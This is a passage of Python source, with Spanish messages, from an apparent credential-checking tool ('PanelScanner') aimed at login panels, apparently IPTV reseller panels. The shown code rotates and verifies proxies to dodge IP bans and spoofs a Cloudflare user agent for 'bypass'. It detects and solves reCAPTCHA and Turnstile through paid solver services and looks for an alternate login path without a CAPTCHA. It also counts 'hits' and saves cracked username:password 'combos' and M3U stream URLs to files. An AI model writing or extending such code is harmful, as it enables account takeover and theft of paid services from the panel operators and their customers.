                if self.is_valid_host_port(host, port):
                    return 'auth', {
                        'host': host.strip(), 
                        'port': port.strip(), 
                        'username': username.strip(), 
                        'password': password.strip()
                    }
            elif len(parts) == 2:
                host, port = parts
                if self.is_valid_host_port(host, port):
                    return 'simple', {
                        'host': host.strip(), 
                        'port': port.strip()
                    }

            logging.warning(f"Formato de proxy no reconocido: {proxy_line}")
            return None, None

        except Exception as e:
            logging.error(f"Error detectando formato de proxy: {str(e)}")
            return None, None

    def verify_simple_proxy(self, proxy_info, proxy_type_str):
        """Verifica proxy simple (sin autenticación)"""
        try:
            host = proxy_info['host']
            port = proxy_info['port']
            proxy_simple = f"{host}:{port}"

            proxies = {
                'http': f'{proxy_type_str}://{proxy_simple}',
                'https': f'{proxy_type_str}://{proxy_simple}'
            }

            response = requests.get(
                self.test_url, 
                proxies=proxies, 
                timeout=self.timeout,
                verify=False
            )

            if response.status_code == 200:
                try:
                    data = response.json()
                    if data.get('status') == 'success':
                        return True, data.get('country', 'Unknown')
                except:
                    pass
            return False, None

        except Exception as e:
            logging.error(f"Error verificando proxy simple: {str(e)}")
            return False, None

    def verify_auth_proxy(self, proxy_info, proxy_type_str):
        """Verifica proxy con autenticación"""
        try:
            host = proxy_info['host']
            port = proxy_info['port']
            username = proxy_info['username']
            password = proxy_info['password']

            if password == "***":
                logging.error(f"Error: Intentando verificar proxy con contraseña enmascarada")
                return False, None

            proxy_url = f"{proxy_type_str}://{username}:{password}@{host}:{port}"

            proxies = {
                'http': proxy_url,
                'https': proxy_url
            }

            response = requests.get(
                self.test_url,
                proxies=proxies,
                timeout=15,
                verify=False
            )

            if response.status_code == 200:
                try:
                    data = response.json()
                    if data.get('status') == 'success':
                        return True, data.get('country', 'Unknown')
                except:
                    pass

            return False, None

        except Exception as e:
            logging.error(f"Error verificando proxy con auth: {str(e)}")
            return False, None

    def verify_proxies_parallel_enhanced(self, proxy_list, proxy_type_str):
        """Versión mejorada que maneja ambos formatos de proxy"""
        print(f"\n{Fore.CYAN}Verificando proxies... Por favor espere.{Fore.RESET}")

        valid_proxies = []
        results = {}
        total = len(proxy_list)

        def verify_worker(proxy_line):
            try:
                original_line = proxy_line.strip()

                format_type, proxy_info = self.detect_proxy_format(original_line)

                if format_type == 'auth':
                    is_valid, country = self.verify_auth_proxy(proxy_info, proxy_type_str)
                    display_proxy = f"{proxy_info['host']}:{proxy_info['port']}:{proxy_info['username']}:***"

                    if is_valid:
                        print(f"{Fore.GREEN}✅ {display_proxy} ({country}){Fore.RESET}")
                        return original_line, country
                    else:
                        print(f"{Fore.RED}❌ {display_proxy}{Fore.RESET}")

                elif format_type == 'simple':
                    is_valid, country = self.verify_simple_proxy(proxy_info, proxy_type_str)
                    display_proxy = f"{proxy_info['host']}:{proxy_info['port']}"

                    if is_valid:
                        print(f"{Fore.GREEN}✅ {display_proxy} ({country}){Fore.RESET}")
                        return original_line, country
                    else:
                        print(f"{Fore.RED}❌ {display_proxy}{Fore.RESET}")

                return None

            except Exception as e:
                logging.error(f"Error verificando proxy {proxy_line}: {str(e)}")
                return None

        with ThreadPoolExecutor(max_workers=min(50, len(proxy_list))) as executor:
            futures = [executor.submit(verify_worker, proxy) for proxy in proxy_list]

            try:
                progress_widgets = [
                    f'{Fore.GREEN}Progreso: {Fore.RESET}',
                    progressbar.Percentage(),
                    ' ',
                    progressbar.Bar(marker=f'{Fore.GREEN}█{Fore.RESET}'),
                    ' ',
                    progressbar.ETA()
                ]
                bar = progressbar.ProgressBar(widgets=progress_widgets, maxval=total)
                bar.start()
            except:
                bar = None

            completed = 0
            for future in concurrent.futures.as_completed(futures):
                completed += 1
                result = future.result()

                if result:
                    proxy, country = result
                    valid_proxies.append(proxy)
                    results[proxy] = country

                if bar:
                    bar.update(completed)

            if bar:
                bar.finish()

        valid_count = len(valid_proxies)
        print(f"\n{Fore.GREEN}Proxies válidos encontrados: {valid_count}/{total} ({(valid_count/total)*100:.2f}%){Fore.RESET}")

        if valid_count > 0:
            print(f"\n{Fore.CYAN}Distribución por países:{Fore.RESET}")
            country_stats = {}
            for proxy in valid_proxies:
                country = results[proxy]
                country_stats[country] = country_stats.get(country, 0) + 1

            for country, count in sorted(country_stats.items(), key=lambda x: x[1], reverse=True):
                print(f"{Fore.YELLOW}{country}: {count} proxies{Fore.RESET}")

        return valid_proxies

    def is_valid_host_port(self, host, port):
        """Valida que host y puerto sean válidos"""
        try:
            port_num = int(port)
            if not (1 <= port_num <= 65535):
                return False

            if not host or len(host.strip()) == 0:
                return False

            import re
            if not re.match(r'^[a-zA-Z0-9.-]+$', host):
                return False

            return True

        except (ValueError, TypeError):
            return False

    def loadProxiesFromFile(self, _proxyType, _proxiesFile):
        """Carga proxies desde archivo"""
        self.proxyType = _proxyType
        self.proxiesFile = _proxiesFile

        try:
            with open(self.proxiesFile, "r", encoding="utf-8") as f:
                raw_proxies = f.readlines()

            clean_proxies = [line.strip() for line in raw_proxies if line.strip()]

            has_auth_proxies = any(len(line.split(':')) == 4 for line in clean_proxies[:10])

            if has_auth_proxies:
                print(f"{Fore.CYAN}🔐 Proxies con autenticación detectados{Fore.RESET}")
                self.proxy_auth_format = True
            else:
                print(f"{Fore.CYAN}🔓 Proxies simples detectados{Fore.RESET}")
                self.proxy_auth_format = False

            proxy_type_str = {
                self.SOCKS5: "socks5",
                self.SOCKS4: "socks4",
                self.HTTP: "http",
                self.HTTP_AUTH: "http",
                self.IPVANISH: "socks5"
            }.get(_proxyType, "http")

            print(f"\n{Fore.YELLOW}📋 Total de proxies en el archivo: {len(clean_proxies)}{Fore.RESET}")
            verify_choice = input(f"{Fore.CYAN}¿Desea verificar los proxies antes de usarlos? (s/n): {Fore.RESET}").lower().strip()

            if verify_choice == 's':

                valid_proxies = self.verify_proxies_parallel_enhanced(clean_proxies, proxy_type_str)

                timestamp = datetime.now().strftime("%Y%m%d_%H")
                valid_proxies_file = self.proxiesFile.replace('.txt', f'_valid.txt')

                with open(valid_proxies_file, 'w') as f:
                    f.write(f"# Proxies válidos - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"# Formato detectado: {'Autenticación' if self.proxy_auth_format else 'Simple'}\n")
                    f.write(f"# Total válidos: {len(valid_proxies)}\n")
                    f.write("#" + "="*50 + "\n")
                    for proxy in valid_proxies:
                        f.write(f"{proxy}\n")

                print(f"\n{Fore.GREEN}✅ Archivo de proxies válidos guardado como: {valid_proxies_file}{Fore.RESET}")
            else:

                print(f"{Fore.YELLOW}⚠️ Saltando verificación de proxies. Se usarán todos los proxies del archivo.{Fore.RESET}")
                valid_proxies = clean_proxies

            self.proxiesList = []
            for proxy_line in valid_proxies:
                try:
                    proxy_obj = self.create_proxy_object(proxy_line.strip(), proxy_type_str)
                    if proxy_obj:
                        self.proxiesList.append(proxy_obj)
                except Exception as e:
                    logging.error(f"Error procesando proxy {proxy_line}: {e}")
                    continue

            self.totalProxies = len(self.proxiesList)
            self.useProxies = self.totalProxies > 0

            print(f"{Fore.GREEN}✅ Proxies cargados para uso: {self.totalProxies}{Fore.RESET}")

        except Exception as e:
            logging.error(f"Error loading proxy file: {e}")
            self.useProxies = False

    def create_proxy_object(self, proxy_line, proxy_type_str):
        """Crea objeto proxy según el formato detectado"""
        try:
            format_type, proxy_info = self.detect_proxy_format(proxy_line)

            if format_type == 'auth':
                host = proxy_info['host']
                port = proxy_info['port']
                username = proxy_info['username']
                password = proxy_info['password']

                proxy_url = f"{proxy_type_str}://{username}:{password}@{host}:{port}"

            elif format_type == 'simple':
                host = proxy_info['host']
                port = proxy_info['port']
                proxy_url = f"{proxy_type_str}://{host}:{port}"
            else:
                return None

            return {
                'http': proxy_url,
                'https': proxy_url,
                'raw': proxy_line,
                'type': format_type
            }

        except Exception as e:
            logging.error(f"Error creando objeto proxy: {e}")
            return None

    def getProxy(self):
        if not self.useProxies or not self.proxiesList:
            return None, -1

        with self.lock:
            for i, proxy in enumerate(self.proxiesList):
                proxy_str = str(proxy)
                proxy_info = self.proxy_uses.get(proxy_str, {'uses': 0, 'failures': 0, 'last_use': None})

                if proxy_info['failures'] < 3:
                    if proxy_info['last_use']:
                        time_since_last_use = time.time() - proxy_info['last_use']
                        if time_since_last_use < 1:
                            continue

                    proxy_info['last_use'] = time.time()
                    proxy_info['uses'] = proxy_info.get('uses', 0) + 1
                    self.proxy_uses[proxy_str] = proxy_info

                    if i < len(self.proxiesList) - 1:  
                        self.proxiesList.append(self.proxiesList.pop(i))

                    return proxy, i

            if not any(info['failures'] < 3 for info in self.proxy_uses.values()):
                logging.warning("Reiniciando contadores de fallos de proxies")
                self.proxy_uses = {}
                if self.proxiesList:
                    return self.proxiesList[0], 0

            return None, -1

    def recycle_proxy(self, proxy):
        with self.lock:
            try:
                proxy_str = str(proxy)
                if proxy_str not in self.proxy_uses:
                    self.proxy_uses[proxy_str] = {'uses': 0, 'failures': 0, 'last_use': None}

                self.proxy_uses[proxy_str]['uses'] += 1
                self.proxy_uses[proxy_str]['last_use'] = time.time()

                if self.proxy_uses[proxy_str]['failures'] < 3:
                    if proxy in self.proxiesList:
                        self.proxiesList.remove(proxy)
                        self.proxiesList.append(proxy)
                    logging.info(f"Proxy reciclado: {proxy_str}")
                else:
                    logging.warning(f"Proxy descartado por exceso de fallos: {proxy_str}")

            except Exception as e:
                logging.error(f"Error reciclando proxy: {e}")

    def eliminateProxy(self, proxy):
        with self.lock:
            try:
                self.proxiesList.remove(proxy)
                self.totalProxies = len(self.proxiesList)

                if self.totalProxies < self.min_proxies_required:
                    print(f"\n{Fore.RED}¡ADVERTENCIA! Quedan muy pocos proxies ({self.totalProxies}){Fore.RESET}")
                    print(f"{Fore.RED}El programa se detendrá para evitar el baneo de IP.{Fore.RESET}")
                    time.sleep(2)
                    sys.exit()

            except ValueError:
                pass

    def menuProxies(self):
        dir = 'Proxies/'
        if not os.path.exists(dir):
            os.makedirs(dir)

        try:
            files = os.listdir(dir)
            if not files:
                print(f"{Fore.RED}No se encontraron archivos de proxies en {dir}{Fore.RESET}")
                return ""

            print(f"\n{Fore.CYAN}Archivos de proxies disponibles:{Fore.RESET}")
            for i, file in enumerate(files):
                print(f"{Fore.YELLOW}{i} -> {file}{Fore.RESET}")

            print(f"\n{Fore.CYAN}{len(files)} archivos encontrados{Fore.RESET}")
            choice = input(f"{Fore.GREEN}Ingrese el número de archivo: {Fore.RESET}")

            if choice.isdigit() and 0 <= int(choice) < len(files):
                return os.path.join(dir, files[int(choice)])
        except Exception as e:
            logging.error(f"Error en menuProxies: {e}")

        return ""

def check_cloudflare_protection(url):
    """Función auxiliar para verificar protección Cloudflare"""
    try:
        detector = CloudflareDetector()
        is_protected = detector.is_cloudflare_protected(url)

        if is_protected:
            print(f"{Fore.YELLOW}🛡️ Cloudflare detectado en {url}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}💡 Se usarán headers optimizados para bypass{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}✅ Sin protección Cloudflare en {url}{Style.RESET_ALL}")

        return is_protected

    except Exception as e:
        print(f"{Fore.RED}❌ Error verificando Cloudflare: {str(e)}{Style.RESET_ALL}")
        return False

class PanelScanner:

    def __init__(self):
        self.version = "6.2"
        self.retry_accounts = {}
        self.show_retries = False
        self.max_retries = 3
        self.proxy_manager = ScannerProxies()
        self.proxy_manager.useProxies = False

        self.flaresolverr_proxy_url = None
        try:
            if os.path.exists('proxy_working_tecnomolly.txt'):
                with open('proxy_working_tecnomolly.txt', 'r') as f:
                    self.flaresolverr_proxy_url = f.read().strip()
                    if self.flaresolverr_proxy_url:
                        logging.info(f"🌐 Proxy para FlareSolverr cargado: {self.flaresolverr_proxy_url[:50]}...")
        except Exception as e:
            logging.warning(f"⚠️ No se pudo cargar proxy para FlareSolverr: {e}")

        self.successful_results = Queue()
        self.hit = 0
        self.fail = 0
        self.retries = 0
        self.custom = 0
        self.cpm = 0
        self.start_time = None
        self.telegram_enabled = False
        self.usuario_enabled = False
        self.telegram_token = ""
        self.telegram_chat_id = ""
        self.server_url = ""
        self.scanning_complete = False
        try:
            self.terminal_width = os.get_terminal_size().columns
        except:
            self.terminal_width = 80  
        self.last_display = ""
        self.active_threads = 0
        self.thread_lock = threading.Lock()
        self.combo_en_uso = ""

        self.session = requests.Session()
        self.session.verify = False

        self.use_rescue_strategy = False
        self.original_url = None

        self.setup_directories()
        self.current_password = None
        self.accounts_table = None
        self.successful_results = Queue()

        self.logging_enabled = False  
        self.setup_logging()

        self.current_time = ""
        self.ua = UserAgent()

        self.stats = {
            'checked': 0,
            'remaining': 0,
            'total': 0,
            'start_pos': 0
        }
        self.progress_percentage = 0.0
        self.ua = UserAgent()
        self.retry_queue = Queue()
        self.processed_retries = set()

        self.hit_by = ""
        self.panel_type = ""

        self.reseller_hits = []  
        self.extracted_accounts = []  
        self.tracking_lock = threading.Lock()  

    def get_valid_input(self, prompt, input_type="text", min_val=None, max_val=None, valid_options=None, allow_empty=False):
        """Solicita input validado del usuario"""
        while True:
            try:
                user_input = input(prompt).strip()

                if not user_input:
                    if allow_empty:
                        return user_input
                    print(f"{Fore.RED}❌ La respuesta no puede estar vacía. Intente nuevamente.{Style.RESET_ALL}")
                    continue

                if input_type == "text":
                    return user_input

                elif input_type == "int":
                    try:
                        value = int(user_input)
                        if min_val is not None and value < min_val:
                            print(f"{Fore.RED}❌ El valor debe ser mayor o igual a {min_val}{Style.RESET_ALL}")
                            continue
                        if max_val is not None and value > max_val:
                            print(f"{Fore.RED}❌ El valor debe ser menor o igual a {max_val}{Style.RESET_ALL}")
                            continue
                        return value
                    except ValueError:
                        print(f"{Fore.RED}❌ Debe ingresar un número válido{Style.RESET_ALL}")
                        continue

                elif input_type == "choice":
                    if valid_options and user_input.lower() in valid_options:
                        return user_input.lower()
                    print(f"{Fore.RED}❌ Opción inválida. Opciones válidas: {', '.join(valid_options)}{Style.RESET_ALL}")
                    continue

                elif input_type == "url":
                    if not user_input.startswith(('http://', 'https://')):
                        user_input = f'http://{user_input}'

                    from urllib.parse import urlparse
                    parsed = urlparse(user_input)
                    if parsed.scheme and parsed.netloc:
                        return user_input
                    print(f"{Fore.RED}❌ URL inválida. Debe incluir dominio/IP{Style.RESET_ALL}")
                    continue

            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}⚠️ Operación cancelada por el usuario{Style.RESET_ALL}")
                return None
            except Exception as e:
                print(f"{Fore.RED}❌ Error: {str(e)}{Style.RESET_ALL}")
                continue

    def check_2captcha_balance(self):
        """Verifica el balance de Captchaai y 2captcha"""
        captchaai_ok = False
        twocaptcha_ok = False

        try:
            import captchaai
            solver = captchaai.CaptchaAI(CAPTCHAAI_API_KEY)
            balance = solver.balance()
            print(f"{Fore.CYAN}💰 Balance Captchaai: ${balance}{Style.RESET_ALL}")

            if float(balance) >= 0.01:
                captchaai_ok = True
            else:
                print(f"{Fore.YELLOW}⚠️ Balance insuficiente en Captchaai{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.YELLOW}⚠️ Error verificando balance Captchaai: {str(e)}{Style.RESET_ALL}")

        try:
            from twocaptcha import TwoCaptcha
            solver = TwoCaptcha(TWOCAPTCHA_API_KEY)

            balance = solver.balance()
            print(f"{Fore.CYAN}💰 Balance 2captcha: ${balance}{Style.RESET_ALL}")

            if float(balance) >= 0.01:
                twocaptcha_ok = True
            else:
                print(f"{Fore.YELLOW}⚠️ Balance insuficiente en 2captcha{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.YELLOW}⚠️ Error verificando balance 2captcha: {str(e)}{Style.RESET_ALL}")

        if captchaai_ok or twocaptcha_ok:
            return True

        print(f"{Fore.RED}❌ Balance insuficiente en todos los servicios{Style.RESET_ALL}")
        return False

    def detect_recaptcha(self, html_content):
        """Detecta si hay un reCAPTCHA en la página - VERSIÓN MEJORADA"""
        try:
            captcha_patterns = [
                r'data-sitekey="([^"]+)"',
                r'sitekey\s*[:=]\s*[\'"]([^\'"]+)[\'"]',
                r'grecaptcha\.render\([^,]+,\s*{\s*[\'"]?sitekey[\'"]?\s*:\s*[\'"]([^\'"]+)[\'"]',
                r'www\.google\.com/recaptcha/api\.js.*?render=([^&"\']+)',
            ]

            for pattern in captcha_patterns:
                match = re.search(pattern, html_content, re.IGNORECASE)
                if match:
                    sitekey = match.group(1)
                    logging.info(f"reCAPTCHA detectado con sitekey: {sitekey}")
                    return sitekey

            if 'www.google.com/recaptcha' in html_content or 'grecaptcha' in html_content:
                logging.info("reCAPTCHA detectado pero no se pudo extraer sitekey")
                return True

            return None
        except Exception as e:
            logging.error(f"Error detectando reCAPTCHA: {str(e)}")
            return None

    def detect_turnstile(self, html_content):
        """Detecta si hay Cloudflare Turnstile en la página"""
        try:
            turnstile_patterns = [
                r'data-sitekey="([^"]+)".*?turnstile',
                r'turnstile.*?data-sitekey="([^"]+)"',
                r'challenges\.cloudflare\.com/turnstile.*?sitekey[\'"]?\s*[:=]\s*[\'"]([^\'"]+)',
                r'cf-turnstile.*?data-sitekey="([^"]+)"',
            ]

            for pattern in turnstile_patterns:
                match = re.search(pattern, html_content, re.IGNORECASE | re.DOTALL)
                if match:
                    sitekey = match.group(1)
                    logging.info(f"🛡️ Cloudflare Turnstile detectado con sitekey: {sitekey}")
                    print(f"{Fore.YELLOW}🛡️ Cloudflare Turnstile detectado con sitekey: {sitekey}{Style.RESET_ALL}")
                    return sitekey

            if 'challenges.cloudflare.com/turnstile' in html_content or 'cf-turnstile' in html_content:
                logging.info("🛡️ Cloudflare Turnstile detectado pero no se pudo extraer sitekey")
                print(f"{Fore.YELLOW}🛡️ Cloudflare Turnstile detectado pero no se pudo extraer sitekey{Style.RESET_ALL}")
                return True

            return None
        except Exception as e:
            logging.error(f"Error detectando Turnstile: {str(e)}")
            return None

    def solve_recaptcha(self, sitekey, page_url):
        """Resuelve reCAPTCHA usando Captchaai primero, luego 2captcha como fallback"""

        try:
            import captchaai
            solver = captchaai.CaptchaAI(CAPTCHAAI_API_KEY)

            logging.info("🤖 Resolviendo reCAPTCHA con Captchaai...")
            print(f"{Fore.CYAN}🤖 Resolviendo reCAPTCHA con Captchaai...{Style.RESET_ALL}")

            result = solver.recaptcha(
                sitekey=sitekey,
                url=page_url,
                version='v2'
            )

            if result and 'code' in result:
                logging.info("✅ reCAPTCHA resuelto exitosamente con Captchaai")
                print(f"{Fore.GREEN}✅ reCAPTCHA resuelto con Captchaai{Style.RESET_ALL}")
                return result['code']
            else:
                logging.error(f"❌ Error resolviendo con Captchaai: {result}")
                print(f"{Fore.YELLOW}⚠️ Error con Captchaai, usando fallback{Style.RESET_ALL}")
        except Exception as e:
            logging.error(f"❌ Error con Captchaai: {str(e)}")
            print(f"{Fore.YELLOW}⚠️ Error con Captchaai: {str(e)}, usando fallback{Style.RESET_ALL}")

        try:
            from twocaptcha import TwoCaptcha
            solver = TwoCaptcha(TWOCAPTCHA_API_KEY)

            logging.info("🤖 Resolviendo reCAPTCHA con 2captcha...")
            print(f"{Fore.CYAN}🤖 Resolviendo reCAPTCHA con 2captcha...{Style.RESET_ALL}")

            result = solver.recaptcha(
                sitekey=sitekey,
                url=page_url
            )

            if result and 'code' in result:
                logging.info("✅ reCAPTCHA resuelto exitosamente con 2captcha")
                print(f"{Fore.GREEN}✅ reCAPTCHA resuelto con 2captcha{Style.RESET_ALL}")
                return result['code']
            else:
                logging.error(f"❌ Error resolviendo reCAPTCHA con 2captcha: {result}")
                print(f"{Fore.RED}❌ Error con 2captcha: {result}{Style.RESET_ALL}")
                return None

        except Exception as e:
            logging.error(f"❌ Error con 2captcha: {str(e)}")
            print(f"{Fore.RED}❌ Error con 2captcha: {str(e)}{Style.RESET_ALL}")
            return None

    def validate_url_with_rescue_logic_quick(self, url):
        """Versión rápida de validación para múltiples URLs"""
        try:
            response = self.make_request('get', url, timeout=8)

            if not response or response.status_code != 200:
                return None, False, None

            has_recaptcha = self.detect_recaptcha(response.text)

            if not has_recaptcha:
                return url, False, None

            parsed = urlparse(url)
            rescue_url = f"{parsed.scheme}://{parsed.netloc}/rescue/login"

            rescue_response = self.make_request('get', rescue_url, timeout=5)
            if rescue_response and rescue_response.status_code == 200:
                rescue_has_captcha = self.detect_recaptcha(rescue_response.text)
                if not rescue_has_captcha:
                    return rescue_url, True, url

            return url, False, None

        except Exception as e:
            logging.error(f"Error validación rápida {url}: {str(e)}")
            return None, False, None

    def load_urls_from_file(self):

        urls_dir = 'urls_paneles'
        if not os.path.exists(urls_dir):
            os.makedirs(urls_dir)
            print(f"{Fore.GREEN}Directorio {urls_dir} creado{Style.RESET_ALL}")
            return []

        files = [f for f in os.listdir(urls_dir) if f.endswith('.txt')]
        if not files:
            print(f"{Fore.RED}No se encontraron archivos de URLs en {urls_dir}{Style.RESET_ALL}")
            return []

        print(f"\n{Fore.CYAN}Archivos de URLs disponibles:{Style.RESET_ALL}")
        for i, file in enumerate(files, 1):
            print(f"{Fore.YELLOW}{i}. {file}{Style.RESET_ALL}")

        choice = self.get_valid_input(
            f"\n{Fore.GREEN}Seleccione el número de archivo: {Style.RESET_ALL}",
            input_type="int",
            min_val=1,
            max_val=len(files)
        )
        if choice is None:
            return []

        file_path = os.path.join(urls_dir, files[choice-1])

        try:

            with open(file_path, 'r', encoding='utf-8') as f:
                urls = {self.normalize_url(line.strip()) for line in f if line.strip()}

            print(f"\n{Fore.CYAN}URLs cargadas: {len(urls)}{Style.RESET_ALL}")

            max_threads = min(50, len(urls))
            threads = self.get_valid_input(
                f"\n{Fore.GREEN}Ingrese número de threads para validación (1-{max_threads}): {Style.RESET_ALL}",
                input_type="int",
                min_val=1,
                max_val=max_threads
            )
            if threads is None:
                return []

            valid, recaptcha, invalid, errors = self.validate_urls_parallel(list(urls), threads)

            timestamp = datetime.now().strftime("%Y%m%d")
            results_file = os.path.join(urls_dir, f'urls_validas_{timestamp}.txt')

            with open(results_file, 'w', encoding='utf-8') as f:
                f.write("=== Resumen de Validación ===\n")
                f.write(f"Total URLs procesadas: {len(urls)}\n")
                f.write(f"URLs válidas: {len(valid)}\n")
                f.write(f"URLs con reCAPTCHA: {len(recaptcha)}\n")
                f.write(f"URLs inválidas: {len(invalid)}\n")
                f.write(f"URLs con error: {len(errors)}\n\n")

                f.write("=== URLs Válidas ===\n")
                for url in valid:
                    f.write(f"{url}\n")

                f.write("\n=== URLs con reCAPTCHA ===\n")
                for url in recaptcha:
                    f.write(f"{url}\n")

                f.write("\n=== URLs Inválidas ===\n")
                for url, reason in invalid:
                    f.write(f"{url} - {reason}\n")

                f.write("\n=== URLs con Error ===\n")
                for url, error in errors:
                    f.write(f"{url} - {error}\n")

            print(f"\n{Fore.CYAN}=== Resumen Final ==={Style.RESET_ALL}")
            print(f"{Fore.GREEN}URLs válidas: {len(valid)}")
            print(f"{Fore.YELLOW}URLs con reCAPTCHA: {len(recaptcha)}")
            print(f"{Fore.RED}URLs inválidas: {len(invalid)}")
            print(f"URLs con error: {len(errors)}")
            print(f"{Fore.CYAN}Resultados guardados en: {results_file}{Style.RESET_ALL}")

            all_usable = valid + recaptcha

            if recaptcha:
                print(f"\n{Fore.CYAN}ℹ️ {len(recaptcha)} URLs con reCAPTCHA serán procesadas usando solvers automáticos{Style.RESET_ALL}")

            if all_usable:
                self.server_url = all_usable[0]
                return all_usable

            return []

        except Exception as e:
            print(f"{Fore.RED}Error procesando archivo: {str(e)}{Style.RESET_ALL}")
            return []

    def sanitize_filename(self, filename):
        """Sanitiza nombres de archivo - VERSIÓN CORREGIDA"""
        if not filename:
            return "unknown"

        invalid_chars = r'<>:"/\|?*[]{}()!@#$%^&+=~`'

        for char in invalid_chars:
            filename = filename.replace(char, '_')

        filename = re.sub(r'[^\w\-_.]', '_', filename)
        filename = re.sub(r'_+', '_', filename)  
        filename = filename.strip('_.')

        if len(filename) > 50:
            filename = filename[:50]

        if not filename or filename == '_':
            filename = "unnamed"

        return filename

    def normalize_server_name(self, url):
        """Normaliza nombre de servidor para evitar carpetas duplicadas"""
        try:
            from urllib.parse import urlparse
            parsed = urlparse(url)

            hostname = parsed.hostname or parsed.netloc.split(':')[0]
            port = parsed.port

            if not port and ':' in parsed.netloc:
                try:
                    port = int(parsed.netloc.split(':')[1])
                except:
                    port = None

            normalized_hostname = hostname.replace('.', '_')

            if port:
                server_name = f"{normalized_hostname}_{port}"
            else:
                server_name = normalized_hostname

            return server_name
        except Exception as e:
            logging.error(f"Error normalizando nombre de servidor: {e}")

            return self.sanitize_filename(urlparse(url).netloc)

    def append_to_file_no_duplicates(self, filepath, content):
        """Agrega contenido a un archivo evitando duplicados"""
        try:

            existing_lines = set()
            if os.path.exists(filepath):
                with open(filepath, 'r', encoding='utf-8') as f:
                    existing_lines = set(line.strip() for line in f if line.strip())

            if content.strip() in existing_lines:
                return False

            with open(filepath, 'a', encoding='utf-8') as f:
                f.write(content.strip() + '\n')

            return True
        except Exception as e:
            logging.error(f"Error agregando a archivo {filepath}: {e}")
            return False

    def save_m3u_to_lista(self, m3u_url, server_name):
        """Guarda URL M3U en el archivo de listas del servidor y en el global"""
        try:

            server_folder = f"hits_paneles/{server_name}"
            os.makedirs(server_folder, exist_ok=True)
            server_lista_file = f"{server_folder}/listas_{server_name}.txt"

            global_folder = "hits_paneles"
            os.makedirs(global_folder, exist_ok=True)
            global_lista_file = f"{global_folder}/listas_extraidas.txt"

            saved_server = self.append_to_file_no_duplicates(server_lista_file, m3u_url)

            saved_global = self.append_to_file_no_duplicates(global_lista_file, m3u_url)

            if saved_server:
                logging.info(f"M3U guardado en lista del servidor: {server_lista_file}")
            if saved_global:
                logging.info(f"M3U guardado en lista global: {global_lista_file}")

            return saved_server or saved_global
        except Exception as e:
            logging.error(f"Error guardando M3U en lista: {e}")
            return False

    def save_combo_to_file(self, username, password, server_name):
        """Guarda combo en el archivo de combos del servidor y en el global"""
        try:
            combo = f"{username}:{password}"

            server_folder = f"hits_paneles/{server_name}"
            os.makedirs(server_folder, exist_ok=True)
            server_combo_file = f"{server_folder}/combos_{server_name}.txt"

            global_folder = "hits_paneles"
            os.makedirs(global_folder, exist_ok=True)
            global_combo_file = f"{global_folder}/combos_extraidos.txt"

            saved_server = self.append_to_file_no_duplicates(server_combo_file, combo)

            saved_global = self.append_to_file_no_duplicates(global_combo_file, combo)

            if saved_server:
                logging.info(f"Combo guardado en archivo del servidor: {server_combo_file}")
            if saved_global:
                logging.info(f"Combo guardado en archivo global: {global_combo_file}")

            return saved_server or saved_global
        except Exception as e:
            logging.error(f"Error guardando combo: {e}")
            return False

    def get_headers(self, url):
        parsed = urlparse(url)
        proto = parsed.scheme
        host = parsed.netloc
        base_url = f"{proto}://{host}"
        headers = {
            "User-Agent": "Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online) AppleWebKit/534.34",
            "Pragma": "no-cache",
            "Accept": "application/json, text/javascript, */*; q=0.01",            
            "Host": host,
            "Referer": url,
            "Origin": base_url,
            "Upgrade-Insecure-Requests": "1"
        }
        return headers

    def get_terminal_width(self) -> int:
        try:
            import os
            terminal_size = os.get_terminal_size()
            width = terminal_size.columns
        except:
            try:
                import subprocess
                width = int(subprocess.check_output(['tput', 'cols']))
            except:
                import platform
                system = platform.system().lower()

                if "qpython" in sys.version.lower():
                    width = 35  
                elif "pydroid" in sys.version.lower():
                    width = 60
                elif "android" in sys.version.lower():
                    width = 50 
                elif "windows" in system:
                    width = 80
                else:
                    width = 70

        return max(35, min(width, 120))

    def setup_logging(self):
        if self.logging_enabled:
            logging.basicConfig(
                level=logging.INFO,
                format='%(asctime)s - %(levelname)s - %(message)s',
                handlers=[
                    logging.FileHandler('panel_scanner.log'),
                    logging.StreamHandler()
                ]
            )
        else:
            logging.getLogger().setLevel(logging.CRITICAL)
            logging.getLogger().handlers = []

    def toggle_logging(self, enable=None):
        if enable is None:
            enable = not self.logging_enabled

        self.logging_enabled = enable
        self.setup_logging()

        status = "activado" if enable else "desactivado"
        print(f"{Fore.CYAN}Logging {status}{Style.RESET_ALL}")

    def normalize_url(self, url):

        try:

            if not url.startswith(('http://', 'https://')):
                url = f'http://{url}'

            parsed = urlparse(url)

            hostname = parsed.netloc.lower()
            if hostname.startswith('www.'):
                hostname = hostname[4:]

            path = parsed.path.rstrip('/')
            if not path:
                path = '/'

            normalized = f"{parsed.scheme}://{hostname}{path}"
            if parsed.query:
                normalized += f"?{parsed.query}"

            return normalized

        except Exception as e:
            logging.error(f"Error normalizando URL {url}: {str(e)}")
            return url

    def pbar(self, checked, total, width=50):

        try:

            progress = min(1.0, checked / total)
            max_width = min(width, self.terminal_width - 20)
            filled_length = int(max_width * progress)
            filled_length = min(filled_length, max_width)

            bar = (
                f"{Fore.GREEN}{'■' * filled_length}"
                f"{Fore.WHITE}{'□' * (max_width - filled_length)}"
                f"{Style.RESET_ALL}"
            )
            percentage = min(100, progress * 100)

            progress_line = f"\r[{bar}] {Fore.YELLOW}{percentage:.1f}%{Style.RESET_ALL}"
            print(progress_line, end='', flush=True)

        except Exception as e:
            print(f"\r[{Fore.RED}Error generando barra: {str(e)}{Style.RESET_ALL}]", end='', flush=True)

    def validate_urls_parallel(self, urls, max_threads=50):

        valid_urls = Queue()
        recaptcha_urls = Queue()
        invalid_urls = Queue()
        error_urls = Queue()

        total_urls = len(urls)
        processed = Value('i', 0)

        def validate_url(url):
            try:
                if not url.startswith(('http://', 'https://')):
                    url = f'http://{url}'

                parsed = urlparse(url)
                if not all([parsed.scheme, parsed.netloc]):
                    error_urls.put((url, "URL mal formada"))
                    return

                response = requests.get(
                    url,
                    timeout=10,
                    verify=False,
                    allow_redirects=True
                )

                if 'sitekey="6L' in response.text or 'data-sitekey="6L' in response.text:
